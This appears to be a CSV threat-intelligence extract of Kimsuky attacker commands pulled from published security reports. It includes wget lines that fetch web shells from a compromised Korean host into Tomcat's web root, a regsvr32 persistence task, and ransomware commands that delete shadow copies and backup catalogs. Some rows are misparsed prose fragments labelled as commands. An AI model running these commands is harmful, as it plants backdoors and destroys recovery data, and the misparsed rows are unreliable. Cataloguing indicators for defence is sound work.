schema_version,actor_ref,artifact_id,observation_id,artifact_type,value,normalized_value,disposition,observed_at,observed_at_precision,observed_at_status,observed_at_basis,source_published_at,source_id,source_path,source_location,campaign_refs,malware_refs,infrastructure_refs,roles,campaign_count,seen_in_multiple_campaigns,confidence,tlp,extraction_method,context_excerpt,analyst_notes
1.0.0,actor--kimsuky,artifact--sha256:506b51b847301b60a614f7101594ba73deea02f1b84822b782fc58f861374400,observation--sha256:1dd88b03fe41db1e67643eafa11c8d747b05f9f94ea2cf3a3cd9999b86804020,command,wget http://designinvent.co.kr/2.b -o /tmp/abc,wget http://designinvent.co.kr/2.b -o /tmp/abc,candidate,,unknown,unknown,not-stated,2021-10-01T00:00:00Z,source--operation-newton,kimsuky/Operation_Newton_Kimsuky-APPLE(SEED).pdf,"{""page"": 12}","[""activity--operation-newton""]","[""malware--appleseed""]","[""infra--compromised-web-servers""]","[""c2"",""download"",""exfiltration"",""payload""]",1,false,high,TLP:CLEAR,pdf-text,"OPERATION NEWTON: HI KIMSUKY? DID AN APPLE(SEED) REALLY FALL... KIM ET AL. 12 VIRUS BULLETIN CONFERENCE OCTOBER 2021  Taskrun (command): C:\Windows\system32\regsvr32.exe/s""C:\ProgramData\Intel\Driverdriver.cfg""  Schedule type: every 30min 4.2 Command and scripting interpreter On a Linux server, after infiltrating the internal server, the web shell was downloaded from the outside using the CLI command, and execution permission was granted. After downloading the file from the outside through the",
1.0.0,actor--kimsuky,artifact--sha256:b2f2a2408727bac9a50a2e77e3249ac23ab579c32882fd682c5eea841bfea8e3,observation--sha256:20867397470661a93e63e70eb7c0a4c256edbbd153c0ed001057a5c323d8a486,command,wget http://designinvent.co.kr/a.txt -O /apache/apache-tomcat-7.0.103/webapps/ROOT/newlist.txt,wget http://designinvent.co.kr/a.txt -O /apache/apache-tomcat-7.0.103/webapps/ROOT/newlist.txt,candidate,,unknown,unknown,not-stated,2021-10-01T00:00:00Z,source--operation-newton,kimsuky/Operation_Newton_Kimsuky-APPLE(SEED).pdf,"{""page"": 13}","[""activity--operation-newton""]","[""malware--appleseed""]","[""infra--compromised-web-servers""]","[""c2"",""download"",""exfiltration"",""payload""]",1,false,high,TLP:CLEAR,pdf-text,OPERATION NEWTON: HI KIMSUKY? DID AN APPLE(SEED) REALLY FALL... KIM ET AL. 13VIRUS BULLETIN CONFERENCE OCTOBER 2021 wget http://designinvent.co.kr/c.txt -O /apache/apache-tomcat-7.0.103/webapps/ROOT/newlist.jspx wget http://designinvent.co.kr/a.txt -o /apache/apache-tomcat-7.0.103/webapps/ROOT/newlist.txt wget http://designinvent.co.kr/a.txt /apache/apache-tomcat-7.0.103/webapps/ROOT/newlist.txt wget http://designinvent.co.kr/a.txt -O /apache/apache-tomcat-7.0.103/webapps/ROOT/newlist.txt wget h,
1.0.0,actor--kimsuky,artifact--sha256:cf42fd127cc3e5e1c9b84db445c0bda09166bdc54cbb244dbde9a440abcd6969,observation--sha256:b24792c7976f4efcd358b67b6825bd990b52d836f09d271d994adc86541b73f4,command,wget http://designinvent.co.kr/a.txt -o /apache/apache-tomcat-7.0.103/webapps/ROOT/newlist.jspx,wget http://designinvent.co.kr/a.txt -o /apache/apache-tomcat-7.0.103/webapps/ROOT/newlist.jspx,candidate,,unknown,unknown,not-stated,2021-10-01T00:00:00Z,source--operation-newton,kimsuky/Operation_Newton_Kimsuky-APPLE(SEED).pdf,"{""page"": 12}","[""activity--operation-newton""]","[""malware--appleseed""]","[""infra--compromised-web-servers""]","[""c2"",""download"",""exfiltration"",""payload""]",1,false,high,TLP:CLEAR,pdf-text,"OPERATION NEWTON: HI KIMSUKY? DID AN APPLE(SEED) REALLY FALL... KIM ET AL. 12 VIRUS BULLETIN CONFERENCE OCTOBER 2021  Taskrun (command): C:\Windows\system32\regsvr32.exe/s""C:\ProgramData\Intel\Driverdriver.cfg""  Schedule type: every 30min 4.2 Command and scripting interpreter On a Linux server, after infiltrating the internal server, the web shell was downloaded from the outside using the CLI command, and execution permission was granted. After downloading the file from the outside through the",
1.0.0,actor--kimsuky,artifact--sha256:50ee1d7a3f992bb92200f2a11ebccccc6fe531f5c266be833b67440266d6d94d,observation--sha256:58009e65f8c3e840641dc103aa313207b89079eba7fb3506a59bcfbeb52da8e7,command,wget http://designinvent.co.kr/a.txt -o /apache/apache-tomcat-7.0.103/webapps/ROOT/newlist.txt,wget http://designinvent.co.kr/a.txt -o /apache/apache-tomcat-7.0.103/webapps/ROOT/newlist.txt,candidate,,unknown,unknown,not-stated,2021-10-01T00:00:00Z,source--operation-newton,kimsuky/Operation_Newton_Kimsuky-APPLE(SEED).pdf,"{""page"": 13}","[""activity--operation-newton""]","[""malware--appleseed""]","[""infra--compromised-web-servers""]","[""c2"",""download"",""exfiltration"",""payload""]",1,false,high,TLP:CLEAR,pdf-text,OPERATION NEWTON: HI KIMSUKY? DID AN APPLE(SEED) REALLY FALL... KIM ET AL. 13VIRUS BULLETIN CONFERENCE OCTOBER 2021 wget http://designinvent.co.kr/c.txt -O /apache/apache-tomcat-7.0.103/webapps/ROOT/newlist.jspx wget http://designinvent.co.kr/a.txt -o /apache/apache-tomcat-7.0.103/webapps/ROOT/newlist.txt wget http://designinvent.co.kr/a.txt /apache/apache-tomcat-7.0.103/webapps/ROOT/newlist.txt wget http://designinvent.co.kr/a.txt -O /apache/apache-tomcat-7.0.103/webapps/ROOT/newlist.txt wget h,
1.0.0,actor--kimsuky,artifact--sha256:a60e21b3154dfa48672d0a8b033bcbe576069448516d60ff4ac6f1ee31410af1,observation--sha256:80e969caf08d6f5876c5c3410a3f519686810905df59a62a18737f5451545168,command,wget http://designinvent.co.kr/a.txt /apache/apache-tomcat-7.0.103/webapps/ROOT/newlist.txt,wget http://designinvent.co.kr/a.txt /apache/apache-tomcat-7.0.103/webapps/ROOT/newlist.txt,candidate,,unknown,unknown,not-stated,2021-10-01T00:00:00Z,source--operation-newton,kimsuky/Operation_Newton_Kimsuky-APPLE(SEED).pdf,"{""page"": 13}","[""activity--operation-newton""]","[""malware--appleseed""]","[""infra--compromised-web-servers""]","[""c2"",""download"",""exfiltration"",""payload""]",1,false,high,TLP:CLEAR,pdf-text,OPERATION NEWTON: HI KIMSUKY? DID AN APPLE(SEED) REALLY FALL... KIM ET AL. 13VIRUS BULLETIN CONFERENCE OCTOBER 2021 wget http://designinvent.co.kr/c.txt -O /apache/apache-tomcat-7.0.103/webapps/ROOT/newlist.jspx wget http://designinvent.co.kr/a.txt -o /apache/apache-tomcat-7.0.103/webapps/ROOT/newlist.txt wget http://designinvent.co.kr/a.txt /apache/apache-tomcat-7.0.103/webapps/ROOT/newlist.txt wget http://designinvent.co.kr/a.txt -O /apache/apache-tomcat-7.0.103/webapps/ROOT/newlist.txt wget h,
1.0.0,actor--kimsuky,artifact--sha256:23f744cd3468c8d10fe5e25525cb7ff9a23b6e868b81725ed931f82a0271be06,observation--sha256:a699f5062cf2cfa76afc8f107b386626e6aa0556fa0a7a772a8e1d219b340ebf,command,wget http://designinvent.co.kr/b.txt -o /apache/apache-tomcat-7.0.103/webapps/ROOT/newlist1.txt,wget http://designinvent.co.kr/b.txt -o /apache/apache-tomcat-7.0.103/webapps/ROOT/newlist1.txt,candidate,,unknown,unknown,not-stated,2021-10-01T00:00:00Z,source--operation-newton,kimsuky/Operation_Newton_Kimsuky-APPLE(SEED).pdf,"{""page"": 13}","[""activity--operation-newton""]","[""malware--appleseed""]","[""infra--compromised-web-servers""]","[""c2"",""download"",""exfiltration"",""payload""]",1,false,high,TLP:CLEAR,pdf-text,OPERATION NEWTON: HI KIMSUKY? DID AN APPLE(SEED) REALLY FALL... KIM ET AL. 13VIRUS BULLETIN CONFERENCE OCTOBER 2021 wget http://designinvent.co.kr/c.txt -O /apache/apache-tomcat-7.0.103/webapps/ROOT/newlist.jspx wget http://designinvent.co.kr/a.txt -o /apache/apache-tomcat-7.0.103/webapps/ROOT/newlist.txt wget http://designinvent.co.kr/a.txt /apache/apache-tomcat-7.0.103/webapps/ROOT/newlist.txt wget http://designinvent.co.kr/a.txt -O /apache/apache-tomcat-7.0.103/webapps/ROOT/newlist.txt wget h,
1.0.0,actor--kimsuky,artifact--sha256:ccf48dd6c0b6fbbab38405bc9748c61cd3d3386519faf56c6cc1db43ff8bdb4e,observation--sha256:c6055dd79b5ca3044fc940cb09f120d8cba1a50510e9d4ab2455ead4c1ea2bb5,command,wget http://designinvent.co.kr/c.j -O /apache/apache-tomcat-7.0.103/webapps/ROOT/newlist.jspx,wget http://designinvent.co.kr/c.j -O /apache/apache-tomcat-7.0.103/webapps/ROOT/newlist.jspx,candidate,,unknown,unknown,not-stated,2021-10-01T00:00:00Z,source--operation-newton,kimsuky/Operation_Newton_Kimsuky-APPLE(SEED).pdf,"{""page"": 12}","[""activity--operation-newton""]","[""malware--appleseed""]","[""infra--compromised-web-servers""]","[""c2"",""download"",""exfiltration"",""payload""]",1,false,high,TLP:CLEAR,pdf-text,"OPERATION NEWTON: HI KIMSUKY? DID AN APPLE(SEED) REALLY FALL... KIM ET AL. 12 VIRUS BULLETIN CONFERENCE OCTOBER 2021  Taskrun (command): C:\Windows\system32\regsvr32.exe/s""C:\ProgramData\Intel\Driverdriver.cfg""  Schedule type: every 30min 4.2 Command and scripting interpreter On a Linux server, after infiltrating the internal server, the web shell was downloaded from the outside using the CLI command, and execution permission was granted. After downloading the file from the outside through the",
1.0.0,actor--kimsuky,artifact--sha256:e881276280ec081e0fb34641e006ee138728a2167f2ffa7377b86586ded5094e,observation--sha256:6dadf2228100739c71d3a56db3302e5f76a4866e3b98871fcfd9642661840aac,command,wget http://designinvent.co.kr/c.txt -O /apache/apache-tomcat-7.0.103/webapps/ROOT/newlist.jspx,wget http://designinvent.co.kr/c.txt -O /apache/apache-tomcat-7.0.103/webapps/ROOT/newlist.jspx,candidate,,unknown,unknown,not-stated,2021-10-01T00:00:00Z,source--operation-newton,kimsuky/Operation_Newton_Kimsuky-APPLE(SEED).pdf,"{""page"": 13}","[""activity--operation-newton""]","[""malware--appleseed""]","[""infra--compromised-web-servers""]","[""c2"",""download"",""exfiltration"",""payload""]",1,false,high,TLP:CLEAR,pdf-text,OPERATION NEWTON: HI KIMSUKY? DID AN APPLE(SEED) REALLY FALL... KIM ET AL. 13VIRUS BULLETIN CONFERENCE OCTOBER 2021 wget http://designinvent.co.kr/c.txt -O /apache/apache-tomcat-7.0.103/webapps/ROOT/newlist.jspx wget http://designinvent.co.kr/a.txt -o /apache/apache-tomcat-7.0.103/webapps/ROOT/newlist.txt wget http://designinvent.co.kr/a.txt /apache/apache-tomcat-7.0.103/webapps/ROOT/newlist.txt wget http://designinvent.co.kr/a.txt -O /apache/apache-tomcat-7.0.103/webapps/ROOT/newlist.txt wget h,
1.0.0,actor--kimsuky,artifact--sha256:bd6b09d06a7fc5740865b9cb20140adacc9ac0acd10474e607a52575c9853e78,observation--sha256:cd0de296b003e24843431384a8d6e92c0423941eb8f67ceafc15ab83ef90d27f,command,wget http://designinvent.co.kr/d.txt -O /apache/apache-tomcat-7.0.103/webapps/ROOT/about2.jspx,wget http://designinvent.co.kr/d.txt -O /apache/apache-tomcat-7.0.103/webapps/ROOT/about2.jspx,candidate,,unknown,unknown,not-stated,2021-10-01T00:00:00Z,source--operation-newton,kimsuky/Operation_Newton_Kimsuky-APPLE(SEED).pdf,"{""page"": 13}","[""activity--operation-newton""]","[""malware--appleseed""]","[""infra--compromised-web-servers""]","[""c2"",""download"",""exfiltration"",""payload""]",1,false,high,TLP:CLEAR,pdf-text,OPERATION NEWTON: HI KIMSUKY? DID AN APPLE(SEED) REALLY FALL... KIM ET AL. 13VIRUS BULLETIN CONFERENCE OCTOBER 2021 wget http://designinvent.co.kr/c.txt -O /apache/apache-tomcat-7.0.103/webapps/ROOT/newlist.jspx wget http://designinvent.co.kr/a.txt -o /apache/apache-tomcat-7.0.103/webapps/ROOT/newlist.txt wget http://designinvent.co.kr/a.txt /apache/apache-tomcat-7.0.103/webapps/ROOT/newlist.txt wget http://designinvent.co.kr/a.txt -O /apache/apache-tomcat-7.0.103/webapps/ROOT/newlist.txt wget h,
1.0.0,actor--kimsuky,artifact--sha256:8b1c2c790dc6e78b36f830996453c4d604e3d6fee34ec1f762a763bdfc8406f6,observation--sha256:eb2e6bb5f096568289a3dd11518336900fe5294d90c1e7ef759e1c05e402d778,command,wget http://designinvent.co.kr/jsp.b -O /apache/apache-tomcat-7.0.103/webapps/ROOT/newlist.txt,wget http://designinvent.co.kr/jsp.b -O /apache/apache-tomcat-7.0.103/webapps/ROOT/newlist.txt,candidate,,unknown,unknown,not-stated,2021-10-01T00:00:00Z,source--operation-newton,kimsuky/Operation_Newton_Kimsuky-APPLE(SEED).pdf,"{""page"": 13}","[""activity--operation-newton""]","[""malware--appleseed""]","[""infra--compromised-web-servers""]","[""c2"",""download"",""exfiltration"",""payload""]",1,false,high,TLP:CLEAR,pdf-text,OPERATION NEWTON: HI KIMSUKY? DID AN APPLE(SEED) REALLY FALL... KIM ET AL. 13VIRUS BULLETIN CONFERENCE OCTOBER 2021 wget http://designinvent.co.kr/c.txt -O /apache/apache-tomcat-7.0.103/webapps/ROOT/newlist.jspx wget http://designinvent.co.kr/a.txt -o /apache/apache-tomcat-7.0.103/webapps/ROOT/newlist.txt wget http://designinvent.co.kr/a.txt /apache/apache-tomcat-7.0.103/webapps/ROOT/newlist.txt wget http://designinvent.co.kr/a.txt -O /apache/apache-tomcat-7.0.103/webapps/ROOT/newlist.txt wget h,
1.0.0,actor--kimsuky,artifact--sha256:afb3cbfd03af7a1d59de993222874564457b6cba2d915687d93624b02328d148,observation--sha256:a3384b74a28aa5dde2ef4f5cb6a7e514e03cc1ce1696b1b0dc5294e4bfad6106,command,wget http://designinvent.co.kr/jsp.b -O /apache/apache-tomcat-7.0.103/webapps/ROOT/newlist1.jspx,wget http://designinvent.co.kr/jsp.b -O /apache/apache-tomcat-7.0.103/webapps/ROOT/newlist1.jspx,candidate,,unknown,unknown,not-stated,2021-10-01T00:00:00Z,source--operation-newton,kimsuky/Operation_Newton_Kimsuky-APPLE(SEED).pdf,"{""page"": 13}","[""activity--operation-newton""]","[""malware--appleseed""]","[""infra--compromised-web-servers""]","[""c2"",""download"",""exfiltration"",""payload""]",1,false,high,TLP:CLEAR,pdf-text,OPERATION NEWTON: HI KIMSUKY? DID AN APPLE(SEED) REALLY FALL... KIM ET AL. 13VIRUS BULLETIN CONFERENCE OCTOBER 2021 wget http://designinvent.co.kr/c.txt -O /apache/apache-tomcat-7.0.103/webapps/ROOT/newlist.jspx wget http://designinvent.co.kr/a.txt -o /apache/apache-tomcat-7.0.103/webapps/ROOT/newlist.txt wget http://designinvent.co.kr/a.txt /apache/apache-tomcat-7.0.103/webapps/ROOT/newlist.txt wget http://designinvent.co.kr/a.txt -O /apache/apache-tomcat-7.0.103/webapps/ROOT/newlist.txt wget h,
1.0.0,actor--kimsuky,artifact--sha256:b1981c2927c98bc30616351cb65dfa15104d6517a76ac0d955ed14c2b9a9d3a3,observation--sha256:3f9420af4972a552bd5d46614cf18f92e76184a4e8c85aae7b839b41167f5b14,command,wget http://designinvent.co.kr/s.txt -O /apache/apache-tomcat-7.0.103/webapps/ROOT/about3.jsp,wget http://designinvent.co.kr/s.txt -O /apache/apache-tomcat-7.0.103/webapps/ROOT/about3.jsp,candidate,,unknown,unknown,not-stated,2021-10-01T00:00:00Z,source--operation-newton,kimsuky/Operation_Newton_Kimsuky-APPLE(SEED).pdf,"{""page"": 13}","[""activity--operation-newton""]","[""malware--appleseed""]","[""infra--compromised-web-servers""]","[""c2"",""download"",""exfiltration"",""payload""]",1,false,high,TLP:CLEAR,pdf-text,OPERATION NEWTON: HI KIMSUKY? DID AN APPLE(SEED) REALLY FALL... KIM ET AL. 13VIRUS BULLETIN CONFERENCE OCTOBER 2021 wget http://designinvent.co.kr/c.txt -O /apache/apache-tomcat-7.0.103/webapps/ROOT/newlist.jspx wget http://designinvent.co.kr/a.txt -o /apache/apache-tomcat-7.0.103/webapps/ROOT/newlist.txt wget http://designinvent.co.kr/a.txt /apache/apache-tomcat-7.0.103/webapps/ROOT/newlist.txt wget http://designinvent.co.kr/a.txt -O /apache/apache-tomcat-7.0.103/webapps/ROOT/newlist.txt wget h,
1.0.0,actor--kimsuky,artifact--sha256:799d90f9c63a196dba816999716fb663e9bb5fda44875d6dc287c235c51c259c,observation--sha256:070b337260de9ed4ea22f680556ae30da9515cedcc232c24605f6a2e9810e632,command,wget http://designinvent.co.kr/s.txt -O /apache/apache-tomcat-7.0.103/webapps/ROOT/about3.txt,wget http://designinvent.co.kr/s.txt -O /apache/apache-tomcat-7.0.103/webapps/ROOT/about3.txt,candidate,,unknown,unknown,not-stated,2021-10-01T00:00:00Z,source--operation-newton,kimsuky/Operation_Newton_Kimsuky-APPLE(SEED).pdf,"{""page"": 13}","[""activity--operation-newton""]","[""malware--appleseed""]","[""infra--compromised-web-servers""]","[""c2"",""download"",""exfiltration"",""payload""]",1,false,high,TLP:CLEAR,pdf-text,OPERATION NEWTON: HI KIMSUKY? DID AN APPLE(SEED) REALLY FALL... KIM ET AL. 13VIRUS BULLETIN CONFERENCE OCTOBER 2021 wget http://designinvent.co.kr/c.txt -O /apache/apache-tomcat-7.0.103/webapps/ROOT/newlist.jspx wget http://designinvent.co.kr/a.txt -o /apache/apache-tomcat-7.0.103/webapps/ROOT/newlist.txt wget http://designinvent.co.kr/a.txt /apache/apache-tomcat-7.0.103/webapps/ROOT/newlist.txt wget http://designinvent.co.kr/a.txt -O /apache/apache-tomcat-7.0.103/webapps/ROOT/newlist.txt wget h,
1.0.0,actor--kimsuky,artifact--sha256:a15d9b01e7a3a73085d146b321d7f9e740ed018f3c65ee3009fa5253eeeda85a,observation--sha256:68a061984c5226d7924048a5b09ecc388a19b5e33cfc80e578d3c8ac3b0eecd4,command,wget http://designinvent.co.kr/s.txt -O /apache/apache-tomcat-7.0.103/webapps/ROOT/newlist.jsp,wget http://designinvent.co.kr/s.txt -O /apache/apache-tomcat-7.0.103/webapps/ROOT/newlist.jsp,candidate,,unknown,unknown,not-stated,2021-10-01T00:00:00Z,source--operation-newton,kimsuky/Operation_Newton_Kimsuky-APPLE(SEED).pdf,"{""page"": 13}","[""activity--operation-newton""]","[""malware--appleseed""]","[""infra--compromised-web-servers""]","[""c2"",""download"",""exfiltration"",""payload""]",1,false,high,TLP:CLEAR,pdf-text,OPERATION NEWTON: HI KIMSUKY? DID AN APPLE(SEED) REALLY FALL... KIM ET AL. 13VIRUS BULLETIN CONFERENCE OCTOBER 2021 wget http://designinvent.co.kr/c.txt -O /apache/apache-tomcat-7.0.103/webapps/ROOT/newlist.jspx wget http://designinvent.co.kr/a.txt -o /apache/apache-tomcat-7.0.103/webapps/ROOT/newlist.txt wget http://designinvent.co.kr/a.txt /apache/apache-tomcat-7.0.103/webapps/ROOT/newlist.txt wget http://designinvent.co.kr/a.txt -O /apache/apache-tomcat-7.0.103/webapps/ROOT/newlist.txt wget h,
1.0.0,actor--kimsuky,artifact--sha256:5cee238d3ffd848b05e50ceb8a60bdf061ef2ff547b1f4dd574227b3f56eecb1,observation--sha256:d0f81081049a02f2de6e71524fe77ac3af0b0741aadadf1c731cd4500768c428,command,wget http://designinvent.co.kr/test.txt -o /apache/apache-tomcat-7.0.103/webapps/ROOT/newlist.jspx,wget http://designinvent.co.kr/test.txt -o /apache/apache-tomcat-7.0.103/webapps/ROOT/newlist.jspx,candidate,,unknown,unknown,not-stated,2021-10-01T00:00:00Z,source--operation-newton,kimsuky/Operation_Newton_Kimsuky-APPLE(SEED).pdf,"{""page"": 12}","[""activity--operation-newton""]","[""malware--appleseed""]","[""infra--compromised-web-servers""]","[""c2"",""download"",""exfiltration"",""payload""]",1,false,high,TLP:CLEAR,pdf-text,"OPERATION NEWTON: HI KIMSUKY? DID AN APPLE(SEED) REALLY FALL... KIM ET AL. 12 VIRUS BULLETIN CONFERENCE OCTOBER 2021  Taskrun (command): C:\Windows\system32\regsvr32.exe/s""C:\ProgramData\Intel\Driverdriver.cfg""  Schedule type: every 30min 4.2 Command and scripting interpreter On a Linux server, after infiltrating the internal server, the web shell was downloaded from the outside using the CLI command, and execution permission was granted. After downloading the file from the outside through the",
1.0.0,actor--kimsuky,artifact--sha256:c59f873e5dd2065b35822472d7099b775c99e45110073bdecd55dd35f437e490,observation--sha256:076159e8bf130a640cc266c9adc9ee5e6abc37f787c38ee580352390660f45bc,command,with heavily obfuscated PowerShell substitution.,with heavily obfuscated PowerShell substitution,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--f2a5c395add9beae,kimsuky/rapid7-Kimsukys-Phishing-and-Payload-Tactics_wp.pdf,"{""page"": 9}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"9 Rapid7 also observed a recent version with an embedded payload that uses PowerShell to extract to %temp% before execution. Similarly, a previous version of Kimsuky LNK payloads uses the same embedded payload method of extraction with heavily obfuscated PowerShell substitution. Figure 7 - Heavily obfuscated embedded payload variant Rapid7 observed several techniques to bypass lazy signatures or tooling limitations: • Move towards in-memory execution to limit dropping malware binaries on disk • ",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:efcd998817960298a60c5dd4ab11875717ae10e2991d9b4da1701dd11d3d8e99,observation--sha256:0748eef981fd5a78bdd0128610fc8b715bc9c4d1209b182f1019121e849108d2,command,wmic shadowcopy delete,wmic shadowcopy delete,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 27}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"When BlacBit ransomware is executed, delete Windows setting information (Table 7) below or turn off the function. bcdedit /set {default} recoveryenabled no 27 For example, deleting a volume shadow copy or backup catalog can be recovered when files are encrypted by ransomware infection. Delete backup catalog (Table 7) Windows settings changed due to BlackBit ransomware infection Ex) (blackfilesupport@firemail.cc)(C8084352)svchost.exe_.i64.BlackBit wbadmin delete catalog -quiet ÿ Ransom note creat",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:5d7a4ce1506f1ffa14bb281fe745ff5dff92f7349496efd4c9bc7caaebd083b5,observation--sha256:cf4d06178a24629cc9f2719f3cb9892754f2e5805f4a0eafab1fcd0d413b3f8d,command," Taskrun (command): C:\Windows\system32\regsvr32.exe/s""C:\ProgramData\Intel\Driverdriver.cfg"," Taskrun (command): C:\Windows\system32\regsvr32.exe/s""C:\ProgramData\Intel\Driverdriver.cfg",candidate,,unknown,unknown,not-stated,2021-10-01T00:00:00Z,source--operation-newton,kimsuky/Operation_Newton_Kimsuky-APPLE(SEED).pdf,"{""page"": 12}","[""activity--operation-newton""]","[""malware--appleseed""]","[""infra--compromised-web-servers""]","[""c2"",""download"",""exfiltration"",""payload""]",1,false,high,TLP:CLEAR,pdf-text,"OPERATION NEWTON: HI KIMSUKY? DID AN APPLE(SEED) REALLY FALL... KIM ET AL. 12 VIRUS BULLETIN CONFERENCE OCTOBER 2021  Taskrun (command): C:\Windows\system32\regsvr32.exe/s""C:\ProgramData\Intel\Driverdriver.cfg""  Schedule type: every 30min 4.2 Command and scripting interpreter On a Linux server, after infiltrating the internal server, the web shell was downloaded from the outside using the CLI command, and execution permission was granted. After downloading the file from the outside through the",
1.0.0,actor--kimsuky,artifact--sha256:5c18e214d92f527eb67d7530b9ff3faefc41e09e9562f2b43252195fa594e6c1,observation--sha256:84d05854134a5b13ef64447d6813eb9ca6a648fa18b9ee64fdc2eba58d1eb06a,command,• Attacker Technique - PowerShell Concatenation Obfuscation,• Attacker Technique - PowerShell Concatenation Obfuscation,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--f2a5c395add9beae,kimsuky/rapid7-Kimsukys-Phishing-and-Payload-Tactics_wp.pdf,"{""page"": 16}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"16 Conclusion Despite deployment of moderate technical capabilities, Kimsuky’s skill in social engineering and persistent approach makes them a formidable adversary. As we track Kimsuky, it remains clear one of the best mitigations is vigilance. This includes both hardening with technical controls around email or corporate monitoring, and the softer side user awareness training or sharing research. Rapid7 Labs will continue researching and publishing insights and guidance on defending against pe",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:53c5e0c675498b023a3733b344a2bdc18346f3da47af548401fea66c64216d58,observation--sha256:34b4f5fee6493bc64c973ac58ab603c0c402cdbe619fe456117f9fa54ce9438b,command,• Embedded files double base64 encoded — ActiveX decode and certutil combined,• Embedded files double base64 encoded — ActiveX decode and certutil combined,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--f2a5c395add9beae,kimsuky/rapid7-Kimsukys-Phishing-and-Payload-Tactics_wp.pdf,"{""page"": 13}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"13 In another example of JavaScript execution of Kimsuky AppleSeed malware, Rapid7 observed use of double base64 encoding of both payload and lure. In this case execution contained an ActiveX decode and the well known lolbin certutil. Some other examples used in this javascript: • Simple string concatenation to obfuscate detection efforts • Variable substitution • Simple folder traversal e.g C:\Windows\..\ProgramData\ = C:\ProgramData\ • Embedded files double base64 encoded — ActiveX decode and ",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:0e190eba90614ff6e4735149510c025b1f933448a021775bf25ff98c11d2beca,observation--sha256:d9e134e351656c9e52e3d321d22959ebecf5da256c5b9d1c3097d52eca375c53,command,• Obfuscating with PowerShell cmd ^ ticks: These will not execute directly in,• Obfuscating with PowerShell cmd ^ ticks: These will not execute directly in,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--f2a5c395add9beae,kimsuky/rapid7-Kimsukys-Phishing-and-Payload-Tactics_wp.pdf,"{""page"": 9}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"9 Rapid7 also observed a recent version with an embedded payload that uses PowerShell to extract to %temp% before execution. Similarly, a previous version of Kimsuky LNK payloads uses the same embedded payload method of extraction with heavily obfuscated PowerShell substitution. Figure 7 - Heavily obfuscated embedded payload variant Rapid7 observed several techniques to bypass lazy signatures or tooling limitations: • Move towards in-memory execution to limit dropping malware binaries on disk • ",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:051df33a6592474790c4a5712a5a8dda32528173757a468e4b61054e9e998fd0,observation--sha256:6e9177ba69af98080e57c1b6f4c4b5b7de717027823125fcfaeb4053c1c6eee0,command,• PowerShell - Concatenate Strings,• PowerShell - Concatenate Strings,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--f2a5c395add9beae,kimsuky/rapid7-Kimsukys-Phishing-and-Payload-Tactics_wp.pdf,"{""page"": 16}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"16 Conclusion Despite deployment of moderate technical capabilities, Kimsuky’s skill in social engineering and persistent approach makes them a formidable adversary. As we track Kimsuky, it remains clear one of the best mitigations is vigilance. This includes both hardening with technical controls around email or corporate monitoring, and the softer side user awareness training or sharing research. Rapid7 Labs will continue researching and publishing insights and guidance on defending against pe",Actor-directory corpus sweep; ambiguous values remain candidates.
